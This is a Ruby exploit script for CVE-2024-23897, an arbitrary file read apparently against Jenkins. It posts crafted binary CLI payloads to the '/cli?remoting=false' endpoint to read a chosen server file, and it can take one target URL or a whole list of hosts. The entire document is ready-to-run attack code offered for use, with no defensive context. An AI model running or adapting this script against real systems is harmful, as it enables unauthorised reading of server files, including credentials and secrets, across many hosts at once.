require 'optparse'
require 'httparty'
require 'securerandom'

# Color constants
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
ENDC = "\033[0m"

def format_url(url)
  url.start_with?('http://') || url.start_with?('https://') ? url : "http://#{url}"
end

def send_download_request(target_info, uuid_str)
  begin
    response = HTTParty.post("#{target_info}/cli?remoting=false",
                             headers: { 'Session' => uuid_str, 'Side' => 'download' })
    puts "#{GREEN}RESPONSE from #{target_info} \n\n\n#{ENDC} #{response.body}"
  rescue StandardError => e
    puts "#{RED}Error in download request:#{ENDC} #{e.message}"
  end
end

def send_upload_request(target_info, uuid_str, data)
  begin
    HTTParty.post("#{target_info}/cli?remoting=false",
                  headers: { 'Session' => uuid_str, 'Side' => 'upload', 'Content-type' => 'application/octet-stream' },
                  body: data)
  rescue StandardError => e
    puts "#{RED}Error in upload request:#{ENDC} #{e.message}"
  end
end

def launch_exploit(target_url, file_path)
  formatted_url = format_url(target_url)
  uuid_str = SecureRandom.uuid
  data = "\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x0e\x00\x00\x0c@" + file_path.encode + "\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05en_US\x00\x00\x00\x00\x03"

  upload_thread = Thread.new { send_upload_request(formatted_url, uuid_str, data) }
  download_thread = Thread.new { send_download_request(formatted_url, uuid_str) }

  upload_thread.join
  download_thread.join
end

def process_target_list(file_list, file_path)
  targets = File.readlines(file_list).map { |line| format_url(line.strip) }

  targets.each do |target|
    puts "#{YELLOW}Processing target:#{ENDC} #{target}"
    launch_exploit(target, file_path)
  end
end

def main
  options = {}
  OptionParser.new do |opts|
    opts.banner = 'Exploit script for CVE-2024-23897.'

    opts.on('-u', '--url URL', 'Single target URL.') { |url| options[:url] = url }
    opts.on('-l', '--list LIST', 'File with a list of target hosts.') { |list| options[:list] = list }
    opts.on('-f', '--file FILE', 'File path to read from the server.') { |file| options[:file] = file }
  end.parse!

  if options[:url]
    launch_exploit(options[:url], options[:file])
  elsif options[:list]
    process_target_list(options[:list], options[:file])
  else
    puts "#{RED}Error:#{ENDC} Please provide a single target URL (-u) or a list of targets (-l)."
  end
end

if __FILE__ == $PROGRAM_NAME
  main
end
